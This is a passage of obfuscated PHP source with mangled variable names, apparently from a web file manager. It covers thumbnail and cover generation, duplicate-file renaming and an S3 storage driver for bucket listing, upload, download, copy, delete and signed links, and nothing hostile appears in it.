$èÆä˜ä‡, $¦õ‹ş, $°Ùê¿Óø); $this->makeImageCover($üğê«Ì, $èÆä˜ä‡, "\143\x6f\x76\x65\162\137{$¯Ø’İüæ}\137\62\x35\x30\56\x70\156\147", 250); $ºˆº„°Ö = IO::fileNameExist($üğê«Ì, $¦õ‹ş); if ($ºˆº„°Ö) { return IO::fileOut(KodIO::make($ºˆº„°Ö), !1, $¦çËƒ[$ÀÊ’™´¯[32]]); } die; } if (!kodIO::allowCover($¦çËƒ)) { return $this->fileOut($èÆä˜ä‡, !1, $¦çËƒ[$ÀÊ’™´¯[32]]); } $§ĞÃğ­ñ = Cache::get($¦õ‹ş); if ($§ĞÃğ­ñ == $ÀÊ’™´¯[196] || $§ĞÃğ­ñ == $ÀÊ’™´¯[197]) { echo $§ĞÃğ­ñ; die; } Cache::set($¦õ‹ş, $ÀÊ’™´¯[197], 60); $ÛÁéÊìâ = array($üğê«Ì, $¦çËƒ[$ÀÊ’™´¯[87]], $¦õ‹ş, $°Ùê¿Óø); $ÄíÛè‹¿ = $ÀÊ’™´¯[198] . $¦çËƒ[$ÀÊ’™´¯[79]] . $ÀÊ’™´¯[199] . $¦õ‹ş . $ÀÊ’™´¯[200] . $¦çËƒ[$ÀÊ’™´¯[32]] . $ÀÊ’™´¯[201] . $¦çËƒ[$ÀÊ’™´¯[87]]; TaskQueue::add($ÀÊ’™´¯[202], $ÛÁéÊìâ, $ÄíÛè‹¿, $¦õ‹ş); } public function makeImageCover($úœŸ¥ëÔ, $ùò†Ú¿…, $Ø­‡Ùô×, $ÙÔŞç¨) { $¹şô‚Ğğ =& $_SERVER[¦»×‡Ãã]; if (IO::fileNameExist($úœŸ¥ëÔ, $Ø­‡Ùô×)) { return $¹şô‚Ğğ[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ËÌèá¯ = DATA_THUMB . $Ø­‡Ùô×; del_file($ËÌèá¯); $Äô§ê©ø = IO::copy($ùò†Ú¿…, TEMP_FILES, !1, $Ø­‡Ùô×); if (!@file_exists($Äô§ê©ø)) { return $¹şô‚Ğğ[204]; } ImageThumb::createThumb($Äô§ê©ø, $ËÌèá¯, $ÙÔŞç¨, $ÙÔŞç¨ * 10); if (@file_exists($ËÌèá¯)) { Cache::remove($Ø­‡Ùô×); return IO::move($ËÌèá¯, $úœŸ¥ëÔ); } Cache::set($Ø­‡Ùô×, $¹şô‚Ğğ[196], 600); del_file($ËÌèá¯); return $¹şô‚Ğğ[205] . $Äô§ê©ø . $¹şô‚Ğğ[74]; } public function fileOutImageServer($–ë²«€‘, $–ÆË¨ÁĞ = 250) { $this->fileOutImage($–ë²«€‘, $–ÆË¨ÁĞ); } public function fileNameAuto($ÕÙâÒœÙ, $ğ“©ÁÀ, $óÓû¥ã = REPEAT_RENAME, $¬¶şúïª = false) { $„£ë’¬ =& $_SERVER[¦»×‡Ãã]; $ş®Â‚¹¼ = $ÕÙâÒœÙ === $„£ë’¬[12] ? $ğ“©ÁÀ : rtrim($ÕÙâÒœÙ, $„£ë’¬[8]) . $„£ë’¬[8] . $ğ“©ÁÀ; if ($óÓû¥ã == REPEAT_REPLACE || !$this->exist($ş®Â‚¹¼) || $¬¶şúïª && $óÓû¥ã != REPEAT_RENAME_FOLDER) { return $ğ“©ÁÀ; } if ($óÓû¥ã == REPEAT_SKIP) { return !1; } $ó‚ÂıÒ = $„£ë’¬[10] . get_path_ext($ğ“©ÁÀ); $ó‚ÂıÒ = $ó‚ÂıÒ == $„£ë’¬[10] || $¬¶şúïª ? $„£ë’¬[12] : $ó‚ÂıÒ; $ÎíÔÓæ› = 1; $‡´»¾ø = substr($ğ“©ÁÀ, 0, strlen($ğ“©ÁÀ) - strlen($ó‚ÂıÒ)); $ŒÂØ¤€» = $‡´»¾ø . "\50{$ÎíÔÓæ›}\x29{$ó‚ÂıÒ}"; while ($this->exist(rtrim($ÕÙâÒœÙ, $„£ë’¬[8]) . $„£ë’¬[8] . $ŒÂØ¤€»)) { $ŒÂØ¤€» = $‡´»¾ø . "\50{$ÎíÔÓæ›}\x29{$ó‚ÂıÒ}"; $ÎíÔÓæ›++; } return $ŒÂØ¤€»; } private function fileNameAutoList($–á²ÜÇ, $İè¦‹”, $“ÈÀÉØ = false) { $àîèšŞ  =& $_SERVER[¦»×‡Ãã]; $íŞÖ»Æ = $this->listPath($–á²ÜÇ, !0); $íŞÖ»Æ = array_merge($íŞÖ»Æ[$àîèšŞ [85]], $íŞÖ»Æ[$àîèšŞ [86]]); $¹ìáÃî = array_to_keyvalue($íŞÖ»Æ, $àîèšŞ [12], $àîèšŞ [32]); $®©´Ìò… = $àîèšŞ [10] . get_path_ext($İè¦‹”); $®©´Ìò… = $®©´Ìò… == $àîèšŞ [10] || $“ÈÀÉØ ? $àîèšŞ [12] : $®©´Ìò…; $­İ…“ã = substr($İè¦‹”, 0, strlen($İè¦‹”) - strlen($®©´Ìò…)); $ùé‡ºÉ = $­İ…“ã . "\50\60\x29{$®©´Ìò…}"; for ($•£ä¡Åó = 1; $•£ä¡Åó <= count($¹ìáÃî) + 1; $•£ä¡Åó++) { $ùé‡ºÉ = $­İ…“ã . "\50{$•£ä¡Åó}\x29{$®©´Ìò…}"; if (!in_array_not_case($ùé‡ºÉ, $¹ìáÃî)) { return $ùé‡ºÉ; } } return $ùé‡ºÉ; } public function listAllFiles($µ¡“ŒÒ†, $œ…°Ü¿Ü) { $ëƒõ¾´ =& $_SERVER[¦»×‡Ãã]; if (empty($œ…°Ü¿Ü)) { return array(); } $¥µ’çñ€ = array_keys($œ…°Ü¿Ü); $ğÆ±ÃÑò = array(); $µ¡“ŒÒ† = trim($µ¡“ŒÒ†, $ëƒõ¾´[8]); foreach ($œ…°Ü¿Ü as $ÚêÈÉË => $º¶–¨÷Ş) { $Î¬×íÒ½ = ltrim(substr(trim($ÚêÈÉË, $ëƒõ¾´[8]), strlen($µ¡“ŒÒ†)), $ëƒõ¾´[8]); if (substr($ÚêÈÉË, -1) == $ëƒõ¾´[8]) { $Î¬×íÒ½ = rtrim($Î¬×íÒ½, $ëƒõ¾´[8]) . $ëƒõ¾´[8]; } $ğÆ±ÃÑò = array_merge($ğÆ±ÃÑò, $this->slicePath($Î¬×íÒ½)); } $˜Ò’ÒùĞ = array(); foreach (array_unique($ğÆ±ÃÑò) as $‘€²ëîŒ) { $ï—¸ê¤ß = array($ëƒõ¾´[87] => $this->getPathOuter($ëƒõ¾´[8] . $µ¡“ŒÒ† . $ëƒõ¾´[8] . $‘€²ëîŒ), $ëƒõ¾´[78] => 1, $ëƒõ¾´[79] => 0); if (substr($‘€²ëîŒ, -1) != $ëƒõ¾´[8]) { $ï—¸ê¤ß[$ëƒõ¾´[78]] = 0; $İÃ¶›ó = $this->getPath($µ¡“ŒÒ† . $ëƒõ¾´[8] . $‘€²ëîŒ); if (isset($œ…°Ü¿Ü[$İÃ¶›ó])) { $áÊËˆ¦é = $œ…°Ü¿Ü[$İÃ¶›ó]; if (isset($áÊËˆ¦é[$ëƒõ¾´[79]])) { $ï—¸ê¤ß[$ëƒõ¾´[79]] = intval($áÊËˆ¦é[$ëƒõ¾´[79]]); } if (isset($áÊËˆ¦é[$ëƒõ¾´[206]])) { $ï—¸ê¤ß[$ëƒõ¾´[88]] = intval($áÊËˆ¦é[$ëƒõ¾´[206]]); } } } $˜Ò’ÒùĞ[] = $ï—¸ê¤ß; } return $˜Ò’ÒùĞ; } public function slicePath($úƒŸÇùÙ) { $·Ò¯†á =& $_SERVER[¦»×‡Ãã]; $îä€Â¦Û = explode($·Ò¯†á[8], trim($úƒŸÇùÙ, $·Ò¯†á[8])); $Î‹âá»á = 0; do { ++$Î‹âá»á; $ñËâ„ı×[] = implode($·Ò¯†á[8], array_slice($îä€Â¦Û, 0, $Î‹âá»á)) . $·Ò¯†á[8]; } while ($Î‹âá»á < count($îä€Â¦Û)); $ñËâ„ı×[count($îä€Â¦Û) - 1] = $úƒŸÇùÙ; return $ñËâ„ı×; } public function getHost() { $ùöŠÒ÷à =& $_SERVER[¦»×‡Ãã]; $ÅÜÜÑ” = parse_url(trim($this->domain, $ùöŠÒ÷à[8])); $¾ñ¢Ş²è = isset($ÅÜÜÑ”[$ùöŠÒ÷à[207]]) ? $ÅÜÜÑ”[$ùöŠÒ÷à[207]] : http_type(); $İäà¸Œ = isset($ÅÜÜÑ”[$ùöŠÒ÷à[208]]) ? $ÅÜÜÑ”[$ùöŠÒ÷à[208]] : $ÅÜÜÑ”[$ùöŠÒ÷à[87]]; if (isset($ÅÜÜÑ”[$ùöŠÒ÷à[209]])) { $İäà¸Œ .= $ùöŠÒ÷à[4] . $ÅÜÜÑ”[$ùöŠÒ÷à[209]]; } return $¾ñ¢Ş²è . $ùöŠÒ÷à[210] . $İäà¸Œ; } public function pathEncode($ÆÂ›‘×¾) { $ƒü¡Ï è =& $_SERVER[¦»×‡Ãã]; return str_replace($ƒü¡Ï è[211], $ƒü¡Ï è[8], rawurlencode($ÆÂ›‘×¾)); } public function writeLog($æ¢ÁÜıË = '', $· ß‚Çò = false) { $áëàœ§ =& $_SERVER[¦»×‡Ãã]; $²°Àâ¬… = in_array(ACTION, array($áëàœ§[212], $áëàœ§[213])); if (!$²°Àâ¬… && !GLOBAL_DEBUG) { return; } $ªí†Ğ€ = $æ¢ÁÜıË; static $”—µ’†™ = null; if (!$”—µ’†™) { $”—µ’†™ = strtoupper($this->getType()); } $æ¢ÁÜıË = $”—µ’†™ . $áëàœ§[214] . $æ¢ÁÜıË; if ($· ß‚Çò) { $•˜«ç± = error_get_last(); if ($•˜«ç±) { $æ¢ÁÜıË = array($æ¢ÁÜıË, $•˜«ç±); } } write_log($æ¢ÁÜıË, $áëàœ§[215]); if ($²°Àâ¬…) { throw new Exception($ªí†Ğ€); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($«Í¾ãäÃ) { set_timeout(); require_once SDK_DIR . $_SERVER[¦»×‡Ãã][216]; parent::__construct(); $this->_init($«Í¾ãäÃ); } public function _init($¥ õ—Ÿ) { $äÖ¡¹÷ =& $_SERVER[¦»×‡Ãã]; $this->config = $¥ õ—Ÿ; foreach ($¥ õ—Ÿ as $šÜÜÓ©Ë => $åá·½Î‡) { if (isset($this->{$šÜÜÓ©Ë})) { $this->{$šÜÜÓ©Ë} = $åá·½Î‡; } } $this->endpoint = $¥ õ—Ÿ[$äÖ¡¹÷[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($äÖ¡¹÷[212], $äÖ¡¹÷[213]))) { $this->client->setExceptions(); } } public function setSignVersion($›Æ´•¹¥ = "\x76\x34") { $this->signVer = $›Æ´•¹¥; $this->client->setSignatureVersion($›Æ´•¹¥); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $™Ù›•Áæ) { return null; } } public function isBucketCors() { $¾íù¢Á£ =& $_SERVER[¦»×‡Ãã]; $˜óƒÁ¨Ş = $this->getBucketCors(); if (!$˜óƒÁ¨Ş || !is_array($˜óƒÁ¨Ş)) { return !1; } if (!is_array($˜óƒÁ¨Ş[$¾íù¢Á£[218]])) { $˜óƒÁ¨Ş[$¾íù¢Á£[218]] = explode($¾íù¢Á£[50], $˜óƒÁ¨Ş[$¾íù¢Á£[218]]); } if ($˜óƒÁ¨Ş[$¾íù¢Á£[219]] != $¾íù¢Á£[220] || !in_array($¾íù¢Á£[220], $˜óƒÁ¨Ş[$¾íù¢Á£[218]])) { return !1; } $ÈÁœÛØÉ = array_map($¾íù¢Á£[221], $˜óƒÁ¨Ş[$¾íù¢Á£[222]]); if (!is_array($ÈÁœÛØÉ)) { $ÈÁœÛØÉ = array(); } $¶ª™Ç·½ = array($¾íù¢Á£[223], $¾íù¢Á£[224], $¾íù¢Á£[225], $¾íù¢Á£[226], $¾íù¢Á£[227]); $°“‡¦± = array_diff($¶ª™Ç·½, $ÈÁœÛØÉ); return empty($°“‡¦±); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($Îëî¥², $äæ¬ñ¨· = '', $úò­Š±„ = REPEAT_RENAME) { $ş‹ÑñŒ = $this->setContent($Îëî¥², $äæ¬ñ¨·); if ($ş‹ÑñŒ !== !1) { return $this->getPathOuter($Îëî¥²); } return !1; } public function mkdir($ÊñÑ¬¡ä, $şµ¥Á¥Ç = REPEAT_SKIP) { $ø„€¡è =& $_SERVER[¦»×‡Ãã]; if (empty($ÊñÑ¬¡ä) && $ÊñÑ¬¡ä !== $ø„€¡è[228]) { return !1; } if ($şµ¥Á¥Ç && $this->_isFolder($ÊñÑ¬¡ä)) { return $this->getPathOuter($ÊñÑ¬¡ä); } $¦€üê Ï = $this->setContent($ÊñÑ¬¡ä, $ø„€¡è[12], !0); if ($¦€üê Ï !== !1) { return $this->getPathOuter($ÊñÑ¬¡ä); } return !1; } public function copyFile($ªéí¤, $èƒœË€‘, $³¾şã­ƒ = array()) { $ÂµÛù =& $_SERVER[¦»×‡Ãã]; $Ş‹Şù  = $this->objectMeta($ªéí¤); if (!$Ş‹Şù ) { return !1; } if ($Ş‹Şù [$ÂµÛù[79]] <= 1024 * 1024 * 200) { $«’‘‹«ı = $this->client->copyObject($this->bucket, $ªéí¤, $this->bucket, $èƒœË€‘, $ÂµÛù[229], $³¾şã­ƒ); } else { $«’‘‹«ı = $this->client->multiCopyObject($this->bucket, $ªéí¤, $this->bucket, $èƒœË€‘, $³¾şã­ƒ); } $«’‘‹«ı = $«’‘‹«ı ? $this->getPathOuter($èƒœË€‘) : !1; return $«’‘‹«ı; } public function moveFile($ø™äæÚ², $ŞñÑ Œ´) { if ($this->copyFile($ø™äæÚ², $ŞñÑ Œ´)) { $this->delFile($ø™äæÚ²); return $this->getPathOuter($ŞñÑ Œ´); } return !1; } public function delFile($ï®“û¸Ù) { return $this->client->deleteObject($this->bucket, $ï®“û¸Ù); } public function delFolder($Áœ–¯üà) { $à¤ã¶œô =& $_SERVER[¦»×‡Ãã]; if (!$this->exist($Áœ–¯üà)) { return !0; } $this->listItemCache = !1; $²†¾½úØ = $this->fileList($Áœ–¯üà); $this->listItemCache = !0; $«ü×Âé = trim($Áœ–¯üà, $à¤ã¶œô[8]) . $à¤ã¶œô[8]; if (!empty($Áœ–¯üà) && $Áœ–¯üà !== $à¤ã¶œô[228] && !in_array($«ü×Âé, $²†¾½úØ[$à¤ã¶œô[85]])) { $²†¾½úØ[$à¤ã¶œô[85]][] = $«ü×Âé; } $–ÒûÍÚş = $this->delByBatch($²†¾½úØ[$à¤ã¶œô[86]]); if (!$–ÒûÍÚş) { return !1; } $–ÒûÍÚş = $this->delByBatch($²†¾½úØ[$à¤ã¶œô[85]]); if (!$–ÒûÍÚş) { return !1; } return $this->delFile($«ü×Âé); } private function delByBatch($‹áÒÓÅ‰) { foreach (array_chunk($‹áÒÓÅ‰, 1000) as $­›»ãÛü) { $¿Áß–† = $this->client->deleteObjects($this->bucket, $­›»ãÛü); if (!$¿Áß–†) { return !1; } } return !0; } public function rename($Ç¬í÷—, $–÷¥”Ğ) { return $this->renameObject($Ç¬í÷—, $–÷¥”Ğ); } public function listPath($×—‚²áè, $„¢ğ•ñá = false) { $•—¼Å‡¹ =& $_SERVER[¦»×‡Ãã]; $ãøàŞÅ± = $this->fileList($×—‚²áè, $•—¼Å‡¹[8], !0); foreach ($ãøàŞÅ±[$•—¼Å‡¹[85]] as $üù¼’½ => $Ë–¤ ßØ) { $ãøàŞÅ±[$•—¼Å‡¹[85]][$üù¼’½] = $this->folderInfo($Ë–¤ ßØ, $„¢ğ•ñá, $Ë–¤ ßØ); } foreach ($ãøàŞÅ±[$•—¼Å‡¹[86]] as $üù¼’½ => $Ë–¤ ßØ) { $ãøàŞÅ±[$•—¼Å‡¹[86]][$üù¼’½] = $this->fileInfo($Ë–¤ ßØ[$•—¼Å‡¹[32]], $„¢ğ•ñá, $Ë–¤ ßØ); } return $ãøàŞÅ±; } protected function infoChildren($ÍŠ£„, &$ûÙÙêœ–) { $Ä«”Âßâ =& $_SERVER[¦»×‡Ãã]; $‹¡’¶Àí = $this->fileList($ÍŠ£„, $Ä«”Âßâ[12], !0); $ûÙÙêœ–[$Ä«”Âßâ[81]] += count($‹¡’¶Àí[$Ä«”Âßâ[85]]); $ûÙÙêœ–[$Ä«”Âßâ[80]] += count($‹¡’¶Àí[$Ä«”Âßâ[86]]); foreach ($‹¡’¶Àí[$Ä«”Âßâ[86]] as $€“ÙÍ„») { if (!$€“ÙÍ„» || !$€“ÙÍ„»[$Ä«”Âßâ[79]]) { continue; } $ûÙÙêœ–[$Ä«”Âßâ[79]] += $€“ÙÍ„»[$Ä«”Âßâ[79]]; } } private function fileInfo($³Š’÷Øª, $‘Æ¿Ï¦å = false, $®˜şÚë = array()) { $ššÆ†òÙ =& $_SERVER[¦»×‡Ãã]; $ÄĞ¦Æí¿ = array($ššÆ†òÙ[32] => $this->pathThis($³Š’÷Øª), $ššÆ†òÙ[87] => $this->getPathOuter($³Š’÷Øª), $ššÆ†òÙ[33] => $ššÆ†òÙ[230], $ššÆ†òÙ[169] => $this->ext($³Š’÷Øª), $ššÆ†òÙ[79] => isset($®˜şÚë[$ššÆ†òÙ[79]]) ? $®˜şÚë[$ššÆ†òÙ[79]] : 0); if ($‘Æ¿Ï¦å) { return $ÄĞ¦Æí¿; } $ÄĞ¦Æí¿[$ššÆ†òÙ[231]] = $ÄĞ¦Æí¿[$ššÆ†òÙ[88]] = 0; $ÄĞ¦Æí¿[$ššÆ†òÙ[232]] = $ÄĞ¦Æí¿[$ššÆ†òÙ[233]] = !0; if (empty($®˜şÚë)) { $®˜şÚë = $this->objectMeta($³Š’÷Øª); if (!$®˜şÚë) { return $ÄĞ¦Æí¿; } } if (isset($®˜şÚë[$ššÆ†òÙ[234]]) && $®˜şÚë[$ššÆ†òÙ[234]]) { $ÄĞ¦Æí¿[$ššÆ†òÙ[235]] = $®˜şÚë[$ššÆ†òÙ[234]]; } if (isset($®˜şÚë[$ššÆ†òÙ[206]])) { $ÄĞ¦Æí¿[$ššÆ†òÙ[88]] = $®˜şÚë[$ššÆ†òÙ[206]]; } if (isset($®˜şÚë[$ššÆ†òÙ[79]])) { $ÄĞ¦Æí¿[$ššÆ†òÙ[79]] = $®˜şÚë[$ššÆ†òÙ[79]]; } return $ÄĞ¦Æí¿; } private function folderInfo($´Š—‚Ç¥, $ºêˆÓõ = false, $Ô×çÓ›Ö = array()) { $Éùİ„âÁ =& $_SERVER[¦»×‡Ãã]; $”¯÷—Œô = array($Éùİ„âÁ[32] => $this->pathThis($´Š—‚Ç¥), $Éùİ„âÁ[87] => $this->getPathOuter($Éùİ„âÁ[8] . $´Š—‚Ç¥), $Éùİ„âÁ[33] => $Éùİ„âÁ[78]); if ($ºêˆÓõ) { return $”¯÷—Œô; } $”¯÷—Œô[$Éùİ„âÁ[231]] = $”¯÷—Œô[$Éùİ„âÁ[88]] = 0; $”¯÷—Œô[$Éùİ„âÁ[232]] = $”¯÷—Œô[$Éùİ„âÁ[233]] = !0; if ($´Š—‚Ç¥ == $Éùİ„âÁ[12]) { return $”¯÷—Œô; } if (empty($Ô×çÓ›Ö)) { $Ô×çÓ›Ö = $this->objectMeta(trim($´Š—‚Ç¥, $Éùİ„âÁ[8]) . $Éùİ„âÁ[8]); } if (isset($Ô×çÓ›Ö[$Éùİ„âÁ[206]])) { $”¯÷—Œô[$Éùİ„âÁ[231]] = $Ô×çÓ›Ö[$Éùİ„âÁ[206]]; } return $”¯÷—Œô; } private function fileList($ë÷ÓÁ”, $×áæ§œ± = '', $æ÷İÔõ© = 0) { $Ëì¿ş¦Á =& $_SERVER[¦»×‡Ãã]; $¢¸²îî = rtrim($ë÷ÓÁ”, $Ëì¿ş¦Á[8]) . $Ëì¿ş¦Á[8]; $ö¢é±×ë = $this->listObjs($¢¸²îî, null, null, $×áæ§œ±); if (!$ö¢é±×ë) { return array($Ëì¿ş¦Á[85] => array(), $Ëì¿ş¦Á[86] => array()); } $â÷¨¬ÓÌ = $ô§èÑÏµ = array(); foreach ($ö¢é±×ë[$Ëì¿ş¦Á[236]] as $²€”ç) { $Íà›£ = $²€”ç[$Ëì¿ş¦Á[32]]; if ($Íà›£ == $¢¸²îî) { continue; } $î–†Ò  = isset($²€”ç[$Ëì¿ş¦Á[79]]) ? $²€”ç[$Ëì¿ş¦Á[79]] : 0; $Îƒ“…¬’ = $î–†Ò  == 0 && substr($Íà›£, strlen($Íà›£) - 1, 1) == $Ëì¿ş¦Á[8] ? !0 : !1; $this->cacheMethodInfoSet($Íà›£, $Îƒ“…¬’, $²€”ç); if ($Îƒ“…¬’) { $â÷¨¬ÓÌ[] = $Íà›£; continue; } $ô§èÑÏµ[] = $æ÷İÔõ© ? $²€”ç : $Íà›£; } foreach ($ö¢é±×ë[$Ëì¿ş¦Á[237]] as $²€”ç) { $â÷¨¬ÓÌ[] = $²€”ç[$Ëì¿ş¦Á[32]]; $this->cacheMethodInfoSet($²€”ç[$Ëì¿ş¦Á[32]], !0); } $this->cacheMethodInfoSet($ë÷ÓÁ”, !0); return array($Ëì¿ş¦Á[85] => $â÷¨¬ÓÌ, $Ëì¿ş¦Á[86] => $ô§èÑÏµ); } private function listObjs($³–º€Ï¹, $ Ì‹€©Í = null, $ãëÛŠı = null, $åæ÷…Åµ = null) { $Îä¤”Í =& $_SERVER[¦»×‡Ãã]; $³–º€Ï¹ = trim($³–º€Ï¹, $Îä¤”Í[8]); $–ıË£ƒÁ = empty($³–º€Ï¹) && $³–º€Ï¹ !== $Îä¤”Í[228] ? $Îä¤”Í[12] : $³–º€Ï¹ . $Îä¤”Í[8]; return $this->client->getBucket($this->bucket, $–ıË£ƒÁ, $ Ì‹€©Í, $ãëÛŠı, $åæ÷…Åµ, !0); } public function has($Õ†ä‡Å, $ê†–ª² = false, $¡äÇö•Ä = true) { $ØÊ¤œäÙ =& $_SERVER[¦»×‡Ãã]; $Õ†ä‡Å = trim($Õ†ä‡Å, $ØÊ¤œäÙ[8]); $‰Ø¬í¬‚ = empty($Õ†ä‡Å) && $Õ†ä‡Å !== $ØÊ¤œäÙ[228] ? $ØÊ¤œäÙ[12] : $Õ†ä‡Å . $ØÊ¤œäÙ[8]; $¿ÊÛ€Ê£ = null; $¶Æßª = 500; $¦†°óüğ = $ØÊ¤œäÙ[8]; $¥‚Ôò–• = $Ë©Á“Ó¯ = array(); while (!0) { $‡®ÓÓœ = $this->listObjs($Õ†ä‡Å, $¿ÊÛ€Ê£, $¶Æßª, $¦†°óüğ); if (!$‡®ÓÓœ) { break; } $¿ÊÛ€Ê£ = $‡®ÓÓœ[$ØÊ¤œäÙ[238]]; $ä°¹Î©ø = $‡®ÓÓœ[$ØÊ¤œäÙ[236]]; $¤û°µğ­ = $‡®ÓÓœ[$ØÊ¤œäÙ[237]]; if (empty($ä°¹Î©ø) && empty($¤û°µğ­)) { break; } if (count($ä°¹Î©ø) == 1 && $ä°¹Î©ø[0][$ØÊ¤œäÙ[32]] == $‰Ø¬í¬‚) { break; } if ($ê†–ª²) { if (count($ä°¹Î©ø)) { $ä°¹Î©ø = array_column($ä°¹Î©ø, $ØÊ¤œäÙ[32]); $¥‚Ôò–• = array_merge($¥‚Ôò–•, $ä°¹Î©ø); } if (count($¤û°µğ­)) { $¤û°µğ­ = array_column($¤û°µğ­, $ØÊ¤œäÙ[32]); $Ë©Á“Ó¯ = array_merge($Ë©Á“Ó¯, $¤û°µğ­); } if ($¿ÊÛ€Ê£ === null) { break; } continue; } if ($¡äÇö•Ä) { if (!empty($ä°¹Î©ø)) { if (count($ä°¹Î©ø) > 1 || isset($ä°¹Î©ø[0][$ØÊ¤œäÙ[32]]) && $ä°¹Î©ø[0][$ØÊ¤œäÙ[32]] != $‰Ø¬í¬‚) { return !0; } } } else { if (!empty($¤û°µğ­)) { return !0; } } if ($¿ÊÛ€Ê£ === null) { break; } } if ($ê†–ª²) { $¥‚Ôò–• = array_diff($¥‚Ôò–•, array($‰Ø¬í¬‚)); $¥‚Ôò–• = count(array_unique($¥‚Ôò–•)); $Ë©Á“Ó¯ = count(array_unique($Ë©Á“Ó¯)); return array($ØÊ¤œäÙ[239] => $¥‚Ôò–•, $ØÊ¤œäÙ[240] => $Ë©Á“Ó¯); } return !1; } public function listAll($íÑæÒ†„) { $ëÃÄÄ =& $_SERVER[¦»×‡Ãã]; $éíèæ² = $this->fileList($íÑæÒ†„, $ëÃÄÄ[12], !0); $†è§ùúì = array_to_keyvalue($éíèæ²[$ëÃÄÄ[86]], $ëÃÄÄ[32]); foreach ($éíèæ²[$ëÃÄÄ[85]] as $†éóá×¼) { if (is_string($†éóá×¼)) { $†è§ùúì[$†éóá×¼] = array($ëÃÄÄ[79] => 0); } } return $this->listAllFiles($íÑæÒ†„, $†è§ùúì); } public function canRead($¤³ÏÑöÙ) { $ÇƒÒŒğ¡ =& $_SERVER[¦»×‡Ãã]; $ÈƒÑ­¬Ä = $this->client->getAccessControlPolicy($this->bucket, $¤³ÏÑöÙ); if (!$ÈƒÑ­¬Ä) { return !1; } return in_array($ÈƒÑ­¬Ä, array($ÇƒÒŒğ¡[241], $ÇƒÒŒğ¡[242], $ÇƒÒŒğ¡[243])) ? !0 : !1; } public function canWrite($Î€§£ƒ) { $“Ö¢Î =& $_SERVER[¦»×‡Ãã]; $ö–äÒÜ = $this->client->getAccessControlPolicy($this->bucket, $Î€§£ƒ); if (!$ö–äÒÜ) { return !1; } return in_array($ö–äÒÜ, array($“Ö¢Î[241], $“Ö¢Î[242])) ? !0 : !1; } public function getContent($‚”Ã½Ğ€) { return $this->client->getObject($this->bucket, $‚”Ã½Ğ€); } public function setContent($†¯‰¾ÌÛ, $şÅÑŠÃÉ = '', $½‚‘í¡õ = false) { $“Îõ·‡º =& $_SERVER[¦»×‡Ãã]; $†¯‰¾ÌÛ = $½‚‘í¡õ ? trim($†¯‰¾ÌÛ, $“Îõ·‡º[8]) . $“Îõ·‡º[8] : $†¯‰¾ÌÛ; $ì ‹ªÆî = get_file_mime(get_path_ext($†¯‰¾ÌÛ)); $´é³¢¸ = $this->client->putObject($şÅÑŠÃÉ, $this->bucket, $†¯‰¾ÌÛ, $“Îõ·‡º[229], array(), $ì ‹ªÆî); if (!$´é³¢¸) { return !1; } if ($½‚‘í¡õ) { return !0; } return $´é³¢¸ ? !0 : !1; } public function fileSubstr($ŠÓóúÈ, $íêËç»ñ, $ò§§Ê‹) { $÷Ì·‡ñ = $íêËç»ñ + $ò§§Ê‹ - 1; return $this->client->getObject($this->bucket, $ŠÓóúÈ, array($_SERVER[¦»×‡Ãã][244] => "\x62\171\x74\x65\x73\x3d{$íêËç»ñ}\55{$÷Ì·‡ñ}")); } public function upload($’Úê£½, $æƒçìØ, $àÃ‘˜Èî = false, $«Åõ†ËÔ = REPEAT_REPLACE) { $«ˆ©¥¹ƒ =& $_SERVER[¦»×‡Ãã]; $åàÆ–›¹ = array($«ˆ©¥¹ƒ[245] => @md5_file($æƒçìØ)); $çÃ—õ¾ = array($«ˆ©¥¹ƒ[246] => get_file_mime(get_path_ext($’Úê£½))); if (IO::size($æƒçìØ) <= 1024 * 1024 * 200) { $ïê­úçÚ = $this->client->putObjectFile($æƒçìØ, $this->bucket, $’Úê£½, $«ˆ©¥¹ƒ[229], $åàÆ–›¹, $çÃ—õ¾); return !empty($ïê­úçÚ) ? $this->getPathOuter($’Úê£½) : !1; } $ÖÂ²Â¡‰ = $this->client->multiUploadObject($æƒçìØ, $this->bucket, trim($’Úê£½, $«ˆ©¥¹ƒ[8]), $åàÆ–›¹, $çÃ—õ¾); return $ÖÂ²Â¡‰ ? $this->getPathOuter($’Úê£½) : !1; } public function download($çãÁœ‘š, $ÉìòËò‰) { if (!@is_dir($this->pathFather($ÉìòËò‰)) && !IO::mkdir($this->pathFather($ÉìòËò‰))) { return !1; } $’ËÛ¸òÛ = $this->client->getObject($this->bucket, $çãÁœ‘š, array(), $ÉìòËò‰); return $’ËÛ¸òÛ !== !1 ? $ÉìòËò‰ : !1; } public function link($ÕñïŞêË, $æ–´â¥è = array()) { $ëèÑß¡ê =& $_SERVER[¦»×‡Ãã]; if ($this->signVer == $ëèÑß¡ê[247]) { return $this->client->getAuthenticatedURL($this->bucket, $ÕñïŞêË, 3600 * 12, $æ–´â¥è); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ÕñïŞêË, $ëèÑß¡ê[8]), 3600 * 12, $this->region, array(), !0, $æ–´â¥è); } public function fileOut($Ò™§Ìƒ™, $ÛüÕ £ = false, $ïÄ¼Šœ = false, $È„‡Ø½‹ = '') { $Üä¡§ŞÉ =& $_SERVER[¦»×‡Ãã]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ò™§Ìƒ™, $ÛüÕ £, $ïÄ¼Šœ, $È„‡Ø½‹); } if (!$ïÄ¼Šœ) { $ïÄ¼Šœ = $this->pathThis($Ò™§Ìƒ™); } $ÔÇÜ¿ó‰ = get_file_mime(get_path_ext($ïÄ¼Šœ)); if ($ÔÇÜ¿ó‰ == $Üä¡§ŞÉ[248]) { return parent::fileOut($Ò™§Ìƒ™, $ÛüÕ £, $ïÄ¼Šœ, $È„‡Ø½‹); } $Ğç¤ñ¬Ò = 